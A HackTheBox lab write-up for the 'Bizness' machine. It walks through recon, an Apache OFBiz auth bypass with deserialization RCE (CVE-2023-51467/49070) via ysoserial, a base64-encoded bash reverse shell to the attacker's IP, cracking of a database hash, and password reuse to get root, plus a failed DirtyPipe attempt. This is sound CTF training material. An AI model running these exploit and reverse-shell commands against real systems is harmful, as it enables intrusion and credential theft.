---
render_with_liquid: false
title: HackTheBox Writeup  Bizness
date: 2024-01-09 00:57:55 +1400
tags: [hackthebox, nmap, linux, ffuf, feroxbuster, apache, apache-ofbiz, java, auth-bypass, cve-2023-51467, deserialization, cve-2023-49070, ysoserial, discover-secrets, derby, embedded-db, cyberchef, crypto, hashcat, password-reuse]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Jan  9 00:57:55 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,443 Bizness
Nmap scan report for Bizness (10.10.11.252)
Host is up, received user-set (0.20s latency).
Scanned at 2024-01-09 00:57:55 CST for 24s

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jan  9 00:58:19 2024 -- 1 IP address (1 host up) scanned in 24.71 seconds
```

## 80 - HTTP : Businesses innovative solutions provider


### Info

![](/assets/obsidian/1dac3d39d3e80093fd8cbf002ec0416c.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -r -u "https://bizness.htb/indexFUZZ" -fs 27200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/indexFUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 27200
________________________________________________

.jsp                    [Status: 200, Size: 9307, Words: 913, Lines: 141, Duration: 231ms]
:: Progress: [41/41] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

### Directory

```bash
feroxbuster -t 20 -k -u 'https://bizness.htb/' -o ferox_443_common.txt -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ cat ferox_443_common.txt | awk '$1!=404' | sort -k 4 -n
200      GET        2l        2w       23c https://bizness.htb/ecommerce/robots.txt
200      GET        9l       23w      847c https://bizness.htb/img/favicon.png
200      GET        7l       27w     3309c https://bizness.htb/img/apple-touch-icon.png
200      GET        1l       38w     2303c https://bizness.htb/lib/easing/easing.min.js
200      GET        1l       44w     2608c https://bizness.htb/lib/lightbox/css/lightbox.min.css
200      GET       11l       46w    51284c https://bizness.htb/lib/ionicons/css/ionicons.min.css
200      GET       11l       56w     2406c https://bizness.htb/lib/counterup/counterup.min.js
200      GET        6l       64w     2936c https://bizness.htb/lib/owlcarousel/assets/owl.carousel.min.css
200      GET        4l       66w    31000c https://bizness.htb/lib/font-awesome/css/font-awesome.min.css
200      GET        8l       71w    22355c https://bizness.htb/images/favicon.ico
500      GET       10l       77w     1443c https://bizness.htb/catalog/images
200      GET       36l       82w      949c https://bizness.htb/ecommerce/control
200      GET       10l       83w     4474c https://bizness.htb/lib/superfish/superfish.min.js
200      GET       15l      120w     9418c https://bizness.htb/lib/lightbox/js/lightbox.min.js
200      GET        3l      148w     8159c https://bizness.htb/lib/wow/wow.min.js
200      GET        7l      158w     9028c https://bizness.htb/lib/waypoints/waypoints.min.js
200      GET       11l      188w    16964c https://bizness.htb/lib/animate/animate.min.css
200      GET       14l      228w    20443c https://bizness.htb/lib/touchSwipe/jquery.touchSwipe.min.js
200      GET        2l      247w     7083c https://bizness.htb/lib/jquery/jquery-migrate.min.js
200      GET        7l      279w    42766c https://bizness.htb/lib/owlcarousel/owl.carousel.min.js
200      GET      118l      332w     3375c https://bizness.htb/contactform/contactform.js
200      GET      207l      499w     6663c https://bizness.htb/js/main.js
200      GET       12l      559w    35503c https://bizness.htb/lib/isotope/isotope.pkgd.min.js
200      GET      158l      848w     7078c https://bizness.htb/lib/superfish/hoverIntent.js
200      GET      181l      915w    84161c https://bizness.htb/img/about-mission.jpg
200      GET      168l      952w    75910c https://bizness.htb/img/about-plan.jpg
200      GET        7l      965w    76308c https://bizness.htb/lib/bootstrap/js/bootstrap.bundle.min.js
200      GET      160l     1057w    91694c https://bizness.htb/img/about-vision.jpg
200      GET        4l     1298w    86659c https://bizness.htb/lib/jquery/jquery.min.js
200      GET      492l     1596w    34633c https://bizness.htb/accounting/control
200      GET      492l     1596w    34633c https://bizness.htb/ap/control
200      GET      492l     1596w    34633c https://bizness.htb/ar/control
200      GET      492l     1596w    34633c https://bizness.htb/catalog/control
200      GET      492l     1596w    34633c https://bizness.htb/content/control
200      GET      492l     1596w    34633c https://bizness.htb/control
200      GET      492l     1596w    34633c https://bizness.htb/ebay/control
200      GET      492l     1596w    34633c https://bizness.htb/example/control
200      GET      492l     1596w    34633c https://bizness.htb/marketing/control
200      GET      522l     1736w    27200c https://bizness.htb/
200      GET      522l     1736w    27200c https://bizness.htb/index.html
200      GET        7l     1929w   153182c https://bizness.htb/lib/bootstrap/css/bootstrap.min.css
200      GET     1582l     3107w    26543c https://bizness.htb/css/style.css
200      GET      628l     3558w   288020c https://bizness.htb/img/intro-carousel/3.jpg
200      GET      922l     4934w   402185c https://bizness.htb/img/intro-carousel/5.jpg
200      GET      915l     5085w   372733c https://bizness.htb/img/intro-carousel/2.jpg
200      GET     1176l     7328w   623279c https://bizness.htb/img/intro-carousel/1.jpg
200      GET     1896l     9607w   743797c https://bizness.htb/img/intro-carousel/4.jpg
```

# User Flag
---

## Shell as ofbiz


### Apache OFBiz Authentication Bypass (CVE-2023-49070 and CVE-2023-51467)


#### Identify version

Obtained **apache OFBiz** by viewing `https://bizness.htb/control/`

> **Apache OFBiz** is java based ERP solution for enterprises

![](/assets/obsidian/4d411558944ed215bd1c293935d5a15d.png)

To identify the version, go to login page at `/control/login`

> https://bizness.htb/control/login

The version `Apache OFBiz. Release 18.12` was revealed

![](/assets/obsidian/212fae0c2558ae3cea94cda14f93fad2.png)

#### Validate exploit

Google : `Apache OFBiz. Release 18.12 exploit`

- `CVE-2023-51467`

Google : `CVE-2023-51467 POC`

> https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit

**Auth bypass** -> **Unsafe deserialization** -> RCE

I've slightly modified the exploit for [ysoserial](https://github.com/frohoff/ysoserial)'s path

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness/exploit]
└─$ diff exploit.py exploit_org.py
12,15d11
<
< YSOSERIAL_PATH = "/opt/sectools/web/Deserlialization/ysoserial-all.jar"
<
<
46c42
<     if not os.path.isfile(YSOSERIAL_PATH):
---
>     if not os.path.isfile("ysoserial-all.jar"):
116c112
<         command = f"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED {YSOSERIAL_PATH} CommonsBeanutils1 '{args.cmd}'"
---
>         command = f"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'"
```

Command execution was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness/exploit]
└─$ python exploit.py --url https://bizness.htb --cmd 'ping 10.10.14.7'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness/exploit]
└─$ sudo tcpdump -i tun0 icmp -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:19:16.002857 IP (tos 0x0, ttl 63, id 2589, offset 0, flags [DF], proto ICMP (1), length 84)
    Bizness > fsociety: ICMP echo request, id 61808, seq 1, length 64
```

#### Reverse shell

Encode reverse shell in base64

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ echo "bash -i >& /dev/tcp/10.10.14.7/1111 0>&1"|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzExMTEgMD4mMQo= 
```

However, no special characters can be presented (`+-=/.`), add spaces until they are gone

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ echo "bash  -i >& /dev/tcp/10.10.14.7/1111  0>&1  "|base64 -w0
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNy8xMTExICAwPiYxICAK
```

Final payload :

```bash
bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNy8xMTExICAwPiYxICAK}|{base64,-d}|{bash,-i}
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness/exploit]
└─$ python exploit.py --url https://bizness.htb --cmd 'bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNy8xMTExICAwPiYxICAK}|{base64,-d}|{bash,-i}'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness/exploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.7] from (UNKNOWN) [10.129.60.254] 60924
bash: cannot set terminal process group (720): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
ofbiz@bizness:/opt/ofbiz$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Bizness/exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

ofbiz@bizness:/opt/ofbiz$ export TERM=xterm
ofbiz@bizness:/opt/ofbiz$ id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
ofbiz@bizness:/opt/ofbiz$ cat ~/user.txt
0c41f83f66ff723f0193adec1fffc7c6
```

# Root Flag
---

## From ofbiz to root


### Obtain admin's hash from derby database

```bash
ofbiz@bizness:/opt/ofbiz$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
ofbiz:x:1001:1001:,,,:/home/ofbiz:/bin/bash
```

There's no other users except `root` on the box, It could be `root` who configured `ofbiz`. Dump admin's hash and try password reuse on `root`

I did not see any common DBMS running

```bash
ofbiz@bizness:/opt/ofbiz$ ss -ltnp
State  Recv-Q Send-Q      Local Address:Port  Peer Address:PortProcess
LISTEN 0      511               0.0.0.0:80         0.0.0.0:*
LISTEN 0      128               0.0.0.0:22         0.0.0.0:*
LISTEN 0      511               0.0.0.0:443        0.0.0.0:*
LISTEN 0      100    [::ffff:127.0.0.1]:8080             *:*    users:(("java",pid=836,fd=628))
LISTEN 0      511                  [::]:80            [::]:*
LISTEN 0      50                      *:44885            *:*    users:(("java",pid=788,fd=207))
LISTEN 0      128                  [::]:22            [::]:*
LISTEN 0      100    [::ffff:127.0.0.1]:8443             *:*    users:(("java",pid=836,fd=629))
LISTEN 0      1      [::ffff:127.0.0.1]:10523            *:*    users:(("java",pid=836,fd=36))
LISTEN 0      511                  [::]:443           [::]:*
LISTEN 0      50                      *:40225            *:*    users:(("java",pid=2519,fd=207))
LISTEN 0      100    [::ffff:127.0.0.1]:8009             *:*    users:(("java",pid=836,fd=626))
```

By default, **ofbiz** uses `Apache Derby database`

```bash
ofbiz@bizness:/opt/ofbiz$ cat build.gradle
```

![](/assets/obsidian/32709ce09df59f3836e3aa5b4592a2b5.png)

By searching `apache ofbiz reset admin password`, this [stackoverflow](https://stackoverflow.com/questions/46864959/forgot-apache-ofbiz-admin-password) thread tells how to add admin account within CLI

After making changes to the database, I can find recently modified files in `/opt/ofbiz` to locate the database files

```bash
ofbiz@bizness:/opt/ofbiz$ ./gradlew loadAdminUserLogin -PuserLoginId=schedule
```

```bash
ofbiz@bizness:/opt/ofbiz$ find . -mmin -1
./runtime/data/derby/ofbiz
./runtime/data/derby/ofbiz/seg0/c10e11.dat
./runtime/data/derby/ofbiz/tmp
./runtime/data/derby/ofbiz/db.lck
./runtime/data/derby/ofbiz/log/log32.dat
./runtime/data/derby/ofbizolap
./runtime/data/derby/ofbizolap/tmp
./runtime/data/derby/ofbizolap/db.lck
./runtime/data/derby/ofbiztenant
./runtime/data/derby/ofbiztenant/tmp
./runtime/data/derby/ofbiztenant/db.lck
./runtime/data/derby/derby.log
./runtime/logs
./runtime/logs/error.log
./runtime/logs/ofbiz-2024-01-09-10.log
./runtime/logs/error-2024-01-09-1.log
./runtime/logs/ofbiz.log
./runtime/tmp/AdminUserLoginData.xml
./.gradle/5.0-rc-5/taskHistory/taskHistory.lock
./.gradle/5.0-rc-5/fileChanges/last-build.bin
./.gradle/5.0-rc-5/fileContent/fileContent.lock
./.gradle/5.0-rc-5/fileHashes/fileHashes.lock
./.gradle/buildOutputCleanup/buildOutputCleanup.lock
ofbiz@bizness:/opt/ofbiz$ cd runtime/data/derby/
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ ls -latr
total 24
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Dec 21 09:15 .
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan  9 01:08 ofbiztenant
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan  9 01:08 ofbizolap
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan  9 01:08 ofbiz
-rw-r--r-- 1 ofbiz ofbiz-operator 2320 Jan  9 01:08 derby.log
```

Check for passwords

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ grep -rina 'pwd\|pass'
```

Search for `admin`

![](/assets/obsidian/dd9fea20ea9aeee3d5b4c3b0b2857c51.png)

- `SHA` : Hash type
- `d` : Salt
- `uP0_QaVBpDWFeo8-dRzDqRwXQ2I` : The hash

### Crack the hash

Check source code to find out how the hash was generated (Search `sha` in repo)

> https://github.com/apache/ofbiz-framework/blob/648c212e769759038bbb7fccacd1ada3af09899d/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java#L293

![](/assets/obsidian/0ad0750ababaddb83b645fefd77d57a6.png)

It was URL safe base64 encoded

Use **cyberchef** to URL safe base64 decode the hash then convert it to hex format

> Recipe : https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)To_Hex('None',0)&input=dVAwX1FhVkJwRFdGZW84LWRSekRxUndYUTJJ

![](/assets/obsidian/ac6d9e71b4bc743d3cae3a89b7288208.png)

Confirmed the hash is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ nth -t b8fd3f41a541a435857a8f3e751cc3a91c174362

b8fd3f41a541a435857a8f3e751cc3a91c174362

Most Likely
SHA-1, HC: 100 JtR: raw-sha1 Summary: Used for checksums.See more
HMAC-SHA1 (key = $salt), HC: 160 JtR: hmac-sha1
Haval-128, JtR: haval-128-4
RIPEMD-128, JtR: ripemd-128
```

Search `sha` in [hashcat example hashes reference](https://hashcat.net/wiki/doku.php?id=example_hashes)

The format we need is mode `120` (`salt` + `hash`)

![](/assets/obsidian/513337a02fe80b24d21236fd350ae02d.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ cat loot/db.hash
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

```bash
hashcat loot/db.hash /opt/wordlists/rockyou.txt -m 120
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Bizness]
└─$ hashcat loot/db.hash /opt/wordlists/rockyou.txt -m 120 --show
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
```

### Password reuse

```bash
ofbiz@bizness:/opt/ofbiz$ su
Password:monkeybizness
root@bizness:/opt/ofbiz# id
uid=0(root) gid=0(root) groups=0(root)
root@bizness:/opt/ofbiz# cat ~/root.txt
7fe117c1edc0bfdc89ed23983daddc03
```

# Additional
---

## Failed attempts


### DirtyPipe

```bash
ofbiz@bizness:/opt/ofbiz$ uname -a
Linux bizness 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
```

Get target distro version

```bash
ofbiz@bizness:/opt/ofbiz$ cat /etc/*release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

Build docker container

```bash
cd /tmp
searchsploit -m 50808
sudo docker pull debian:11
sudo docker run --rm -v /tmp:/mnt/tmp -it debian:11 bash
```

Compile exploit

```bash
apt update && apt install make gcc -y
cd /mnt/tmp/
gcc 50808.c -o dirty
```

```bash
python -m http.server 81
```

```bash
ofbiz@bizness:/opt/ofbiz$ wget 10.10.14.7:81/dirty -O /tmp/d && chmod +x /tmp/d
```

Find any SUID binaries with root as owner

```bash
ofbiz@bizness:/opt/ofbiz$ find / -type f -perm -4000 -exec ls -latr {} \; 2>/dev/null
-rwsr-xr-x 1 root root 55528 Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 34896 Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 35040 Jan 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 481608 Dec 21 11:09 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Exploit failed

```bash
ofbiz@bizness:/opt/ofbiz$ /tmp/d /usr/bin/newgrp
[+] hijacking suid binary..
[+] dropping suid shell..
ofbiz@bizness:/opt/ofbiz$ id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
```